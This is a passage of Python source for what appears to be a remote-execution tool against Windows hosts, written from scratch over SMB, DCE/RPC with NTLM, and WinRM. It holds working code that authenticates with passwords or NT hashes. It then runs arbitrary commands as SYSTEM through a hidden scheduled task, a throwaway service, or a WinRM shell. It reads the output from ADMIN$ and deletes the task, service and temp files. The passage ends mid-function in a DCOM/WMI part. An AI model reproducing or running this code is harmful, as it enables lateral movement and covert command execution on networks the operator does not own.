        self.smb.tid = self.tid

    def _transact(self, data):
        self._set_tid()
        self.smb.write(self.fid, data)
        return self.smb.read(self.fid, 4280)

    def _write(self, data):
        self._set_tid()
        self.smb.write(self.fid, data)

    def bind(self, ntlm_ctx, iface_uuid=None, iface_ver=1):
        if iface_uuid is None: iface_uuid = _TSCH_UUID
        self.call_id += 1
        self._auth_ctx_id = 79231
        neg_tok = ntlm_ctx.negotiate()
        body = struct.pack('<HH', 4280, 4280) + struct.pack('<I', 0)
        body += struct.pack('<BBH', 1, 0, 0)
        body += struct.pack('<HBB', 0, 1, 0)
        body += iface_uuid + struct.pack('<HH', iface_ver, 0)
        body += _NDR_UUID + struct.pack('<HH', 2, 0)
        auth_hdr = struct.pack('<BBBBI', 10, 6, 0, 0, self._auth_ctx_id)
        total = 16 + len(body) + 8 + len(neg_tok)
        hdr = struct.pack('<BBBB', 5, 0, 11, 3) + b'\x10\x00\x00\x00'
        hdr += struct.pack('<HHI', total, len(neg_tok), self.call_id)
        resp = self._transact(hdr + body + auth_hdr + neg_tok)

        frag_len = struct.unpack('<H', resp[8:10])[0]
        auth_len = struct.unpack('<H', resp[10:12])[0]
        auth_off = frag_len - auth_len - 8
        challenge = resp[auth_off + 8:auth_off + 8 + auth_len]

        auth_tok = ntlm_ctx.authenticate(challenge)
        pad = b'\x00' * 4
        auth_hdr = struct.pack('<BBBBI', 10, 6, 0, 0, self._auth_ctx_id)
        total = 16 + len(pad) + 8 + len(auth_tok)
        hdr = struct.pack('<BBBB', 5, 0, 16, 3) + b'\x10\x00\x00\x00'
        hdr += struct.pack('<HHI', total, len(auth_tok), self.call_id)
        self._write(hdr + pad + auth_hdr + auth_tok)
        self.call_id += 1

        sk = ntlm_ctx.session_key
        self.c_sign = hashlib.md5(sk + b"session key to client-to-server signing key magic constant\x00").digest()
        self.c_seal = RC4(hashlib.md5(sk + b"session key to client-to-server sealing key magic constant\x00").digest())
        self.s_sign = hashlib.md5(sk + b"session key to server-to-client signing key magic constant\x00").digest()
        self.s_seal = RC4(hashlib.md5(sk + b"session key to server-to-client sealing key magic constant\x00").digest())

    def _unseal(self, enc, sig):
        sq = sig[12:16]
        plain = self.s_seal.crypt(enc)
        self.s_seal.crypt(sig[4:12])
        return plain

    def request(self, opnum, stub):
        self.call_id += 1
        pad_n = (4 - len(stub) % 4) % 4
        padded = stub + b'\xBB' * pad_n
        req_hdr = struct.pack('<I', len(stub)) + struct.pack('<HH', 0, opnum)
        sec_trailer = struct.pack('<BBBBI', 10, 6, pad_n, 0, self._auth_ctx_id)
        total = 16 + len(req_hdr) + len(padded) + 8 + 16
        hdr = struct.pack('<BBBB', 5, 0, 0, 3) + b'\x10\x00\x00\x00'
        hdr += struct.pack('<HHI', total, 16, self.call_id)
        sign_input = hdr + req_hdr + padded + sec_trailer
        sealed = self.c_seal.crypt(padded)
        chk = _hmac.new(self.c_sign, struct.pack('<i', self.seq) + sign_input, hashlib.md5).digest()[:8]
        echk = self.c_seal.crypt(chk)
        sig = struct.pack('<I', 1) + echk + struct.pack('<I', self.seq)
        self.seq += 1
        pdu = hdr + req_hdr + sealed + sec_trailer + sig
        resp = self._transact(pdu)
        if resp[2] == 3:
            fs = struct.unpack('<I', resp[24:28])[0] if len(resp) >= 28 else 0
            raise ValueError(f"RPC FAULT 0x{fs:08x}")
        fl = struct.unpack('<H', resp[8:10])[0]
        al = struct.unpack('<H', resp[10:12])[0]
        ao = fl - al - 8
        ap = resp[ao + 2]
        enc_data = resp[24:ao]
        rsig = resp[ao + 8:ao + 8 + al]
        plain = self._unseal(enc_data, rsig)
        if ap > 0:
            plain = plain[:-ap]
        return plain

def _ndr_uniptr(s, ref_id):
    if s is None:
        return struct.pack('<I', 0)
    enc = (s + '\x00').encode('utf-16-le')
    nc = len(enc) // 2
    d = struct.pack('<I', ref_id) + struct.pack('<III', nc, 0, nc) + enc
    if len(enc) % 4:
        d += b'\x00' * (4 - len(enc) % 4)
    return d
def _ndr_refstr(s):
    enc = (s + '\x00').encode('utf-16-le')
    nc = len(enc) // 2
    d = struct.pack('<III', nc, 0, nc) + enc
    if len(enc) % 4:
        d += b'\x00' * (4 - len(enc) % 4)
    return d
def _ndr_inline(params):
    buf = b''
    ref = 0x00020000
    for typ, val in params:
        if typ == 'd':
            buf += struct.pack('<I', val)
        elif typ == 'u':
            buf += _ndr_uniptr(val, ref)
            if val is not None:
                ref += 4
        elif typ == 'r':
            buf += _ndr_refstr(val)
    return buf
def tsch_register(path, xml, flags=2):
    return _ndr_inline([
        ('u', path), ('r', xml), ('d', flags),
        ('u', None), ('d', 0), ('d', 0), ('u', None),
    ])

def tsch_run(path):
    return _ndr_inline([
        ('r', path), ('d', 0), ('u', None),
        ('d', 0), ('d', 0), ('u', None),
    ])

def tsch_last_run(path):
    return _ndr_inline([('r', path)])

def tsch_delete(path):
    return _ndr_inline([('r', path), ('d', 0)])

def _smb_session(target, domain, user, password, smb_ver="auto", nt_hash=None, port=445, timeout=15):
    if smb_ver == "1":
        s = SMB1(target, port, timeout)
        s.connect()
        s.negotiate()
    elif smb_ver == "3":
        s = SMB2(target, port, timeout)
        s.connect()
        s.negotiate(force_smb3=True)
    elif smb_ver == "2":
        s = SMB2(target, port, timeout)
        s.connect()
        s.negotiate(force_smb3=False)
    else:
        try:
            s = SMB2(target, port, timeout)
            s.connect()
            s.negotiate(force_smb3=False)
        except:
            try: s.disconnect()
            except: pass
            s = SMB1(target, port, timeout)
            s.connect()
            s.negotiate()
    n = NTLMContext(domain, user, password, nt_hash=nt_hash)
    s.session_setup(n)
    return s
def xml_escape(data):
    t = {"&": "&amp;", '"': "&quot;", "'": "&apos;", ">": "&gt;", "<": "&lt;"}
    return "".join(t.get(c, c) for c in data)
_atexec_tmp_files = []
def atexec_exec(target, domain, user, password, command, smb_ver="auto", nt_hash=None, port=445, timeout=15):
    smb = _smb_session(target, domain, user, password, smb_ver, nt_hash, port, timeout)
    try:
        smb.tree_connect("IPC$")
        fid = smb.create("atsvc", 0x0012019F, 7, 1, 0x40)
        dce = DCERPC(smb, smb.tid, fid)
        ntlm_rpc = NTLMContext(domain, user, password, use_mic=True, nt_hash=nt_hash)
        dce.bind(ntlm_rpc)

        tn = "".join(random.choices(string.ascii_letters, k=8))
        tf = tn + ".tmp"
        _atexec_tmp_files.append(tf)
        xml = (
            '<?xml version="1.0" encoding="UTF-16"?>'
            '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">'
            '<Triggers><CalendarTrigger><StartBoundary>2015-07-15T20:35:13</StartBoundary>'
            '<Enabled>true</Enabled><ScheduleByDay><DaysInterval>1</DaysInterval>'
            '</ScheduleByDay></CalendarTrigger></Triggers>'
            '<Principals><Principal id="LocalSystem"><UserId>S-1-5-18</UserId>'
            '<RunLevel>HighestAvailable</RunLevel></Principal></Principals>'
            '<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>'
            '<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>'
            '<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>'
            '<AllowHardTerminate>true</AllowHardTerminate>'
            '<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>'
            '<IdleSettings><StopOnIdleEnd>true</StopOnIdleEnd>'
            '<RestartOnIdle>false</RestartOnIdle></IdleSettings>'
            '<AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled>'
            '<Hidden>true</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle>'
            '<WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit>'
            '<Priority>7</Priority></Settings>'
            '<Actions Context="LocalSystem"><Exec>'
            '<Command>cmd.exe</Command>'
            '<Arguments>/C ' + xml_escape(command) + ' &gt; %windir%\\Temp\\' + tf + ' 2&gt;&amp;1</Arguments>'
            '</Exec></Actions></Task>'
        )
        tp = "\\" + tn
        dce.request(1, tsch_register(tp, xml))
        dce.request(12, tsch_run(tp))
        for _ in range(30):
            resp = dce.request(16, tsch_last_run(tp))
            yr = struct.unpack('<H', resp[0:2])[0] if len(resp) >= 2 else 0
            if yr != 0:
                break
            time.sleep(1)
        try:
            dce.request(13, tsch_delete(tp))
        except:
            pass
        smb.close(fid)

        output = ""
        try:
            old_tid = smb.tid
            smb.tree_connect("ADMIN$")
            for attempt in range(5):
                try:
                    fid2 = smb.create(f"Temp\\{tf}", 0x80|0x01, 1, 1, 0x40)
                    data = b''
                    off = 0
                    while True:
                        try:
                            chunk = smb.read(fid2, 65536, off)
                            if not chunk: break
                            data += chunk
                            off += len(chunk)
                        except:
                            break
                    output = data.decode('utf-8', errors='replace')
                    smb.close(fid2)
                    try:
                        fid3 = smb.create(f"Temp\\{tf}", 0x10080, 7, 1, 0x1040)
                        smb.close(fid3)
                    except: pass
                    break
                except:
                    time.sleep(1)
        except: pass
    finally:
        try: smb.logoff()
        except: pass
        smb.disconnect()
    return output
_SVCCTL_UUID = struct.pack('<IHH', 0x367ABB81, 0x9844, 0x35F1) + b'\xAD\x32\x98\xF0\x38\x00\x10\x03'

def _svcctl_open_scm(dce, target):
    mn = (target + '\x00').encode('utf-16-le')
    db = ('ServicesActive\x00').encode('utf-16-le')
    mnc = len(mn) // 2
    dbc = len(db) // 2
    stub = struct.pack('<I', 0x00020000)
    stub += struct.pack('<III', mnc, 0, mnc) + mn
    if len(mn) % 4: stub += b'\x00' * (4 - len(mn) % 4)
    stub += struct.pack('<I', 0x00020004)
    stub += struct.pack('<III', dbc, 0, dbc) + db
    if len(db) % 4: stub += b'\x00' * (4 - len(db) % 4)
    stub += struct.pack('<I', 0x000F003F)
    resp = dce.request(15, stub)
    return resp[0:20]

def _svcctl_create_service(dce, scm_handle, svc_name, bin_path):
    sn = (svc_name + '\x00').encode('utf-16-le')
    bp = (bin_path + '\x00').encode('utf-16-le')
    snc = len(sn) // 2
    bpc = len(bp) // 2
    stub = scm_handle
    stub += struct.pack('<III', snc, 0, snc) + sn
    if len(sn) % 4: stub += b'\x00' * (4 - len(sn) % 4)
    stub += struct.pack('<I', 0x00020008)
    stub += struct.pack('<III', snc, 0, snc) + sn
    if len(sn) % 4: stub += b'\x00' * (4 - len(sn) % 4)
    stub += struct.pack('<IIII', 0x000F01FF, 0x00000010, 0x00000003, 0x00000001)
    stub += struct.pack('<III', bpc, 0, bpc) + bp
    if len(bp) % 4: stub += b'\x00' * (4 - len(bp) % 4)
    stub += struct.pack('<IIIIIII', 0, 0, 0, 0, 0, 0, 0)
    resp = dce.request(12, stub)
    return resp[4:24]

def _svcctl_start(dce, svc_handle):
    stub = svc_handle + struct.pack('<II', 0, 0)
    try: dce.request(19, stub)
    except: pass

def _svcctl_query_status(dce, svc_handle):
    try:
        resp = dce.request(6, svc_handle)
        state = struct.unpack('<I', resp[4:8])[0] if len(resp) >= 8 else 0
        return state
    except: return 0

def _svcctl_delete(dce, svc_handle):
    try: dce.request(2, svc_handle)
    except: pass

def _svcctl_close(dce, handle):
    try: dce.request(0, handle)
    except: pass

class _DCERaw:
    def __init__(self, smb, tid, fid):
        self.smb, self.tid, self.fid = smb, tid, fid
        self.call_id = 0
    def _set_tid(self):
        self.smb.tid = self.tid
    def bind(self, iface_uuid, iface_ver=1):
        self.call_id += 1
        body = struct.pack('<HH', 4280, 4280) + struct.pack('<I', 0)
        body += struct.pack('<BBH', 1, 0, 0) + struct.pack('<HBB', 0, 1, 0)
        body += iface_uuid + struct.pack('<HH', iface_ver, 0)
        body += _NDR_UUID + struct.pack('<HH', 2, 0)
        total = 16 + len(body)
        hdr = struct.pack('<BBBB', 5, 0, 11, 3) + b'\x10\x00\x00\x00'
        hdr += struct.pack('<HHI', total, 0, self.call_id)
        self._set_tid()
        self.smb.write(self.fid, hdr + body)
        resp = self.smb.read(self.fid, 4280)
        if resp[2] != 12:
            raise ValueError(f"BIND failed type={resp[2]}")
    def request(self, opnum, stub):
        self.call_id += 1
        req_hdr = struct.pack('<I', len(stub)) + struct.pack('<HH', 0, opnum)
        total = 16 + len(req_hdr) + len(stub)
        hdr = struct.pack('<BBBB', 5, 0, 0, 3) + b'\x10\x00\x00\x00'
        hdr += struct.pack('<HHI', total, 0, self.call_id)
        self._set_tid()
        self.smb.write(self.fid, hdr + req_hdr + stub)
        resp = self.smb.read(self.fid, 4280)
        if resp[2] == 3:
            fs = struct.unpack('<I', resp[24:28])[0] if len(resp) >= 28 else 0
            raise ValueError(f"RPC FAULT 0x{fs:08x}")
        return resp[24:]

def svcctl_exec(target, domain, user, password, command, smb_ver="auto", nt_hash=None, port=445, timeout=15):
    smb = _smb_session(target, domain, user, password, smb_ver, nt_hash, port, timeout)
    try:
        smb.tree_connect("IPC$")
        fid = smb.create("svcctl", 0x0012019F, 7, 1, 0x40)
        dce = _DCERaw(smb, smb.tid, fid)
        dce.bind(_SVCCTL_UUID, 2)
        sn = "".join(random.choices(string.ascii_letters, k=8))
        tf = sn + ".tmp"
        bp = f'C:\\Windows\\System32\\cmd.exe /Q /c {command} > C:\\Windows\\Temp\\{tf} 2>&1'
        scm = _svcctl_open_scm(dce, target)
        svc = _svcctl_create_service(dce, scm, sn, bp)
        _svcctl_start(dce, svc)
        for _ in range(15):
            st = _svcctl_query_status(dce, svc)
            if st == 1 or st == 0:
                break
            time.sleep(1)
        time.sleep(2)
        _svcctl_delete(dce, svc)
        _svcctl_close(dce, svc)
        _svcctl_close(dce, scm)
        smb.close(fid)
        output = ""
        try:
            smb.tree_connect("ADMIN$")
            for attempt in range(5):
                try:
                    fid2 = smb.create(f"Temp\\{tf}", 0x80|0x01, 1, 1, 0x40)
                    data = b''
                    off = 0
                    while True:
                        try:
                            chunk = smb.read(fid2, 65536, off)
                            if not chunk: break
                            data += chunk
                            off += len(chunk)
                        except: break
                    output = data.decode('utf-8', errors='replace')
                    smb.close(fid2)
                    try:
                        fid3 = smb.create(f"Temp\\{tf}", 0x10080, 7, 1, 0x1040)
                        smb.close(fid3)
                    except: pass
                    break
                except:
                    time.sleep(1)
        except: pass
    finally:
        try: smb.logoff()
        except: pass
        smb.disconnect()
    return output

def _uuid4():
    b = bytearray(os.urandom(16))
    b[6] = (b[6] & 0x0F) | 0x40
    b[8] = (b[8] & 0x3F) | 0x80
    h = b.hex()
    return f"{h[0:8]}-{h[8:12]}-{h[12:16]}-{h[16:20]}-{h[20:32]}"

class _HTTPConn:
    def __init__(self, target, port=5985, timeout=30):
        self.target, self.port, self.timeout = target, port, timeout
        self.use_ssl = (port == 5986)
        self.sock = None
    def connect(self):
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.settimeout(self.timeout)
        raw.connect((self.target, self.port))
        if self.use_ssl:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            self.sock = ctx.wrap_socket(raw, server_hostname=self.target)
        else:
            self.sock = raw
    def close(self):
        if self.sock:
            try: self.sock.close()
            except: pass
            self.sock = None
    def _recv_all(self, n):
        d = b''
        while len(d) < n:
            c = self.sock.recv(n - len(d))
            if not c: raise ConnectionError("closed")
            d += c
        return d
    def _recv_line(self):
        line = b''
        while not line.endswith(b'\r\n'):
            c = self.sock.recv(1)
            if not c: raise ConnectionError("closed")
            line += c
        return line[:-2]
    def _recv_response(self):
        status_line = self._recv_line().decode()
        parts = status_line.split(' ', 2)
        status = int(parts[1])
        headers = {}
        while True:
            line = self._recv_line()
            if not line: break
            k, v = line.decode().split(': ', 1)
            headers[k.lower()] = v
        body = b''
        if 'content-length' in headers:
            body = self._recv_all(int(headers['content-length']))
        elif headers.get('transfer-encoding', '').lower() == 'chunked':
            while True:
                sz = int(self._recv_line(), 16)
                if sz == 0:
                    self._recv_line()
                    break
                body += self._recv_all(sz)
                self._recv_line()
        return status, headers, body
    def request(self, method, path, headers, body=b''):
        if isinstance(body, str): body = body.encode('utf-8')
        req = f"{method} {path} HTTP/1.1\r\n"
        req += f"Host: {self.target}:{self.port}\r\n"
        req += f"Content-Length: {len(body)}\r\n"
        req += "Connection: keep-alive\r\n"
        for k, v in headers.items():
            req += f"{k}: {v}\r\n"
        req += "\r\n"
        self.sock.sendall(req.encode() + body)
        return self._recv_response()

_WSMAN_NS = (
    'xmlns:s="http://www.w3.org/2003/05/soap-envelope" '
    'xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" '
    'xmlns:wsman="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" '
    'xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"'
)
_REPLY_TO = 'http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous'
_SHELL_URI = 'http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd'

def _wsman_header(target, action, mid, resource_uri=_SHELL_URI, selector="", opts="", port=5985):
    scheme = "https" if port == 5986 else "http"
    return (
        f'<s:Header>'
        f'<wsa:Action mustUnderstand="true">{action}</wsa:Action>'
        f'<wsa:To>{scheme}://{target}:{port}/wsman</wsa:To>'
        f'<wsman:ResourceURI mustUnderstand="true">{resource_uri}</wsman:ResourceURI>'
        f'<wsa:MessageID>uuid:{mid}</wsa:MessageID>'
        f'<wsa:ReplyTo><wsa:Address>{_REPLY_TO}</wsa:Address></wsa:ReplyTo>'
        f'<wsman:MaxEnvelopeSize mustUnderstand="true">153600</wsman:MaxEnvelopeSize>'
        f'<wsman:OperationTimeout>PT60S</wsman:OperationTimeout>'
        f'{selector}{opts}'
        f'</s:Header>'
    )

def _wsman_envelope(header, body_inner):
    return f'<s:Envelope {_WSMAN_NS}>{header}<s:Body>{body_inner}</s:Body></s:Envelope>'

def _extract_tag(xml, tag):
    s = xml.find(f'<{tag}')
    if s < 0:
        s = xml.find(f'<{tag.split(":")[-1]}')
        if s < 0: return ""
    s = xml.find('>', s) + 1
    e = xml.find(f'</{tag}>', s)
    if e < 0:
        short = tag.split(":")[-1] if ":" in tag else tag
        e = xml.find(f'</{short}>', s)
    if e < 0: return ""
    return xml[s:e]

def winrm_exec(target, domain, user, password, command, nt_hash=None, port=5985, timeout=30):
    conn = _HTTPConn(target, port, timeout)
    conn.connect()
    try:
        ntlm = NTLMContext(domain, user, password, nt_hash=nt_hash)
        neg = base64.b64encode(ntlm.negotiate()).decode()
        dummy = '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"><s:Body/></s:Envelope>'
        st, hd, _ = conn.request('POST', '/wsman', {
            'Content-Type': 'application/soap+xml;charset=UTF-8',
            'Authorization': f'Negotiate {neg}'
        }, dummy)
        chal_b64 = hd.get('www-authenticate', '').replace('Negotiate ', '')
        auth_tok = base64.b64encode(ntlm.authenticate(base64.b64decode(chal_b64))).decode()
        mid = _uuid4()
        header = _wsman_header(target, 'http://schemas.xmlsoap.org/ws/2004/09/transfer/Create', mid,
            opts='<wsman:OptionSet><wsman:Option Name="WINRS_NOPROFILE">TRUE</wsman:Option>'
                 '<wsman:Option Name="WINRS_CODEPAGE">65001</wsman:Option></wsman:OptionSet>', port=port)
        body = '<rsp:Shell><rsp:InputStreams>stdin</rsp:InputStreams><rsp:OutputStreams>stdout stderr</rsp:OutputStreams></rsp:Shell>'
        envelope = _wsman_envelope(header, body)
        st, hd, resp = conn.request('POST', '/wsman', {
            'Content-Type': 'application/soap+xml;charset=UTF-8',
            'Authorization': f'Negotiate {auth_tok}'
        }, envelope)
        if st != 200: raise ValueError(f"WinRM create shell: HTTP {st}")
        resp_text = resp.decode('utf-8', errors='replace')
        shell_id = _extract_tag(resp_text, 'rsp:ShellId') or _extract_tag(resp_text, 'ShellId')
        if not shell_id: raise ValueError("no ShellId")
        selector = f'<wsman:SelectorSet><wsman:Selector Name="ShellId">{shell_id}</wsman:Selector></wsman:SelectorSet>'
        mid = _uuid4()
        header = _wsman_header(target, 'http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command', mid,
            selector=selector,
            opts='<wsman:OptionSet><wsman:Option Name="WINRS_CONSOLEMODE_STDIN">TRUE</wsman:Option>'
                 '<wsman:Option Name="WINRS_SKIP_CMD_SHELL">FALSE</wsman:Option></wsman:OptionSet>', port=port)
        body = f'<rsp:CommandLine><rsp:Command>cmd.exe</rsp:Command><rsp:Arguments>/c {xml_escape(command)}</rsp:Arguments></rsp:CommandLine>'
        envelope = _wsman_envelope(header, body)
        st, hd, resp = conn.request('POST', '/wsman', {'Content-Type': 'application/soap+xml;charset=UTF-8'}, envelope)
        if st != 200: raise ValueError(f"WinRM command: HTTP {st}")
        resp_text = resp.decode('utf-8', errors='replace')
        cmd_id = _extract_tag(resp_text, 'rsp:CommandId') or _extract_tag(resp_text, 'CommandId')
        output = ""
        for _ in range(120):
            mid = _uuid4()
            header = _wsman_header(target, 'http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive', mid, selector=selector, port=port)
            body = f'<rsp:Receive><rsp:DesiredStream CommandId="{cmd_id}">stdout stderr</rsp:DesiredStream></rsp:Receive>'
            envelope = _wsman_envelope(header, body)
            st, hd, resp = conn.request('POST', '/wsman', {'Content-Type': 'application/soap+xml;charset=UTF-8'}, envelope)
            resp_text = resp.decode('utf-8', errors='replace')
            pos = 0
            while True:
                si = resp_text.find('<rsp:Stream', pos)
                if si < 0: break
                se = resp_text.find('>', si) + 1
                ee = resp_text.find('</rsp:Stream>', se)
                if ee < 0: break
                b64data = resp_text[se:ee].strip()
                if b64data:
                    try: output += base64.b64decode(b64data).decode('utf-8', errors='replace')
                    except: pass
                pos = ee + 13
            if 'CommandState State="http://schemas.microsoft.com/wbem/wsman/1/windows/shell/CommandState/Done"' in resp_text:
                break
            time.sleep(0.5)
        try:
            mid = _uuid4()
            header = _wsman_header(target, 'http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Signal', mid, selector=selector, port=port)
            body = f'<rsp:Signal CommandId="{cmd_id}"><rsp:Code>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/signal/terminate</rsp:Code></rsp:Signal>'
            conn.request('POST', '/wsman', {'Content-Type': 'application/soap+xml;charset=UTF-8'}, _wsman_envelope(header, body))
        except: pass
        try:
            mid = _uuid4()
            header = _wsman_header(target, 'http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete', mid, selector=selector, port=port)
            conn.request('POST', '/wsman', {'Content-Type': 'application/soap+xml;charset=UTF-8'}, _wsman_envelope(header, ''))
        except: pass
        return output
    finally:
        conn.close()

_IID_IREMACT2 = struct.pack('<IHH', 0x4D9F4AB8, 0x7D1C, 0x11CF) + b'\x86\x1E\x00\x20\xAF\x6E\x7C\x57'
_IID_IREMUNK2_REAL = struct.pack('<IHH', 0x00000143, 0x0000, 0x0000) + b'\xC0\x00\x00\x00\x00\x00\x00\x46'
_CLSID_WBEM_LOGIN = struct.pack('<IHH', 0x8BC3F05E, 0xD86B, 0x11D0) + b'\xA0\x75\x00\xC0\x4F\xB6\x88\x20'
_IID_WBEM_LOGIN = struct.pack('<IHH', 0xDC12A681, 0x737F, 0x11CF) + b'\x88\x4D\x00\xAA\x00\x4B\x2E\x24'
_IID_WBEM_SVC = struct.pack('<IHH', 0x9556DC99, 0x828C, 0x11CF) + b'\xA3\x7E\x00\xAA\x00\x32\x40\xC7'

class DCERPCRaw:
    def __init__(self, host, port, timeout=15):
        self.host, self.port, self.timeout = host, port, timeout
        self.sock = None
        self.call_id = 0
        self._seq = 0
    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.connect((self.host, self.port))
    def disconnect(self):
        if self.sock:
            try: self.sock.close()
            except: pass
            self.sock = None
    def _recv_n(self, n):
        d = b''
        while len(d) < n:
            c = self.sock.recv(n - len(d))
            if not c: raise ConnectionError("closed")
            d += c
        return d
    def _recv_pdu(self):
        hdr = self._recv_n(16)
        frag_len = struct.unpack('<H', hdr[8:10])[0]
        rest = self._recv_n(frag_len - 16)
        return hdr + rest
    def bind(self, iface_uuid, iface_ver=(0,0), ntlm_ctx=None, auth_level=6):
        self.call_id += 1
        self._auth_level = auth_level
        body = struct.pack('<HH', 4280, 4280) + struct.pack('<I', 0)
        body += struct.pack('<BBH', 1, 0, 0)
        body += struct.pack('<HBB', 0, 1, 0)
        body += iface_uuid + struct.pack('<HH', iface_ver[0], iface_ver[1])
        body += _NDR_UUID + struct.pack('<HH', 2, 0)
        if ntlm_ctx:
            neg_tok = ntlm_ctx.negotiate()
            auth_hdr = struct.pack('<BBBBI', 10, auth_level, 0, 0, 0)
            total = 16 + len(body) + 8 + len(neg_tok)
            hdr = struct.pack('<BBBB', 5, 0, 11, 3) + b'\x10\x00\x00\x00'
            hdr += struct.pack('<HHI', total, len(neg_tok), self.call_id)
            self.sock.sendall(hdr + body + auth_hdr + neg_tok)
        else:
            total = 16 + len(body)
            hdr = struct.pack('<BBBB', 5, 0, 11, 3) + b'\x10\x00\x00\x00'
            hdr += struct.pack('<HHI', total, 0, self.call_id)
            self.sock.sendall(hdr + body)
        resp = self._recv_pdu()
        if resp[2] == 0x0C:
            frag_len = struct.unpack('<H', resp[8:10])[0]
            auth_len = struct.unpack('<H', resp[10:12])[0]
            if auth_len > 0:
                auth_off = frag_len - auth_len - 8
                return resp[auth_off + 8:auth_off + 8 + auth_len]
        return resp
    def auth3(self, ntlm_ctx, challenge):
        self.call_id += 1
        auth_tok = ntlm_ctx.authenticate(challenge)
        auth_hdr = struct.pack('<BBBBI', 10, self._auth_level, 0, 0, 0)
        pad = b'\x00' * 4
        total = 16 + len(pad) + 8 + len(auth_tok)
        hdr = struct.pack('<BBBB', 5, 0, 16, 3) + b'\x10\x00\x00\x00'
        hdr += struct.pack('<HHI', total, len(auth_tok), self.call_id)
        self.sock.sendall(hdr + pad + auth_hdr + auth_tok)
    def request(self, opnum, stub, obj_uuid=None):
        self.call_id += 1
        flags = 0x03
        if obj_uuid: flags |= 0x80
        req_hdr = struct.pack('<I', len(stub)) + struct.pack('<HH', 0, opnum)
        obj_part = obj_uuid if obj_uuid else b''
        total = 16 + len(obj_part) + len(req_hdr) + len(stub)
        hdr = struct.pack('<BBBB', 5, 0, 0, flags) + b'\x10\x00\x00\x00'
        hdr += struct.pack('<HHI', total, 0, self.call_id)
        self.sock.sendall(hdr + obj_part + req_hdr + stub)
        resp = self._recv_pdu()
        if resp[2] == 3:
            fs = struct.unpack('<I', resp[24:28])[0] if len(resp) >= 28 else 0
            raise ValueError(f"RPC FAULT 0x{fs:08x}")
        return resp[24:]
    def _ntlm_sign(self, ntlm_ctx, message, seal=False):
        sk = ntlm_ctx.session_key
        c_sign = hashlib.md5(sk + b"session key to client-to-server signing key magic constant\x00").digest()
        c_seal_key = hashlib.md5(sk + b"session key to client-to-server sealing key magic constant\x00").digest()
        c_seal = RC4(c_seal_key)
        chk = _hmac.new(c_sign, struct.pack('<i', self._seq) + message, hashlib.md5).digest()[:8]
        echk = c_seal.crypt(chk)
        sig = struct.pack('<I', 1) + echk + struct.pack('<I', self._seq)
        self._seq += 1
        return sig
    def request_auth(self, opnum, stub, ntlm_ctx, obj_uuid=None):
        self.call_id += 1
        al = getattr(self, '_auth_level', 6)
        flags = 0x03
        if obj_uuid: flags |= 0x80
        pad_n = (4 - len(stub) % 4) % 4
        padded = stub + b'\xBB' * pad_n
        req_hdr = struct.pack('<I', len(stub)) + struct.pack('<HH', 0, opnum)
        obj_part = obj_uuid if obj_uuid else b''
        sec_trailer = struct.pack('<BBBBI', 10, al, pad_n, 0, 0)
        total = 16 + len(obj_part) + len(req_hdr) + len(padded) + 8 + 16
        hdr = struct.pack('<BBBB', 5, 0, 0, flags) + b'\x10\x00\x00\x00'
        hdr += struct.pack('<HHI', total, 16, self.call_id)
        sign_input = hdr + obj_part + req_hdr + padded + sec_trailer
        if al >= 6:
            sk = ntlm_ctx.session_key
            c_seal_key = hashlib.md5(sk + b"session key to client-to-server sealing key magic constant\x00").digest()
            c_seal = RC4(c_seal_key)
            sealed = c_seal.crypt(padded)
            sig = self._ntlm_sign(ntlm_ctx, sign_input)
            self.sock.sendall(hdr + obj_part + req_hdr + sealed + sec_trailer + sig)
        else:
            sig = self._ntlm_sign(ntlm_ctx, sign_input)
            self.sock.sendall(hdr + obj_part + req_hdr + padded + sec_trailer + sig)
        resp = self._recv_pdu()
        if resp[2] == 3:
            fs = struct.unpack('<I', resp[24:28])[0] if len(resp) >= 28 else 0
            raise ValueError(f"RPC FAULT 0x{fs:08x}")
        return resp[24:]

def _orpcthis():
    cid = os.urandom(16)
    hdr = struct.pack('<HH', 5, 7) + struct.pack('<II', 0, 0) + cid
    hdr += struct.pack('<I', 0x00020008)
    hdr += struct.pack('<II', 0, 0)
    hdr += struct.pack('<I', 0x0002000c)
    hdr += struct.pack('<I', 0)
    return hdr

def _find_tcp_port(resp_data):
    search = b'\x07\x00'
    idx = 0
    while True:
        idx = resp_data.find(search, idx)
        if idx < 0: break
        after = resp_data[idx+2:]
        nul = after.find(b'\x00\x00')
        if nul > 0:
            raw = after[:nul+1]
            try:
                s = raw.decode('utf-16-le').rstrip('\x00')
                if '[' in s and ']' in s:
                    port_str = s.split('[')[1].rstrip(']')
                    if port_str.isdigit():
                        return int(port_str)
            except: pass
        idx += 2
    idx = 0
    while True:
        idx = resp_data.find(b'\x07', idx)
        if idx < 0: break
        after = resp_data[idx+1:]
        nul = after.find(b'\x00')
        if 4 < nul < 30:
            raw = after[:nul]
            try:
                s = raw.decode('ascii')
                if '[' in s and ']' in s:
                    port_str = s.split('[')[1].rstrip(']')
                    if port_str.isdigit():
                        return int(port_str)
            except: pass
        idx += 1
    return None

def _parse_remote_activation_resp(data):
    port = _find_tcp_port(data)
    ipid = None
    for off in range(len(data) - 16):
